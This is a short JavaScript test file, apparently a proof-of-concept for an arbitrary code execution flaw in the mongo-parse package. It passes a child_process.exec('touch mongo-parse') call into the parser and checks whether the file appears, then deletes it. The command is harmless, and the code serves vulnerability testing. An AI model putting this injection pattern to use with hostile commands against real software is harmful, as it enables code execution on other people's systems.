//
test("Arbitrary code execution in mongo-parse", () => {
  const fs = require("fs");
  const parser = require("mongo-parse");
  const path = "./mongo-parse";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    let query = parser.parse(
      require("child_process").exec("touch mongo-parse")
    );
  } catch (error) {}

  sleep.sleep(5);

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
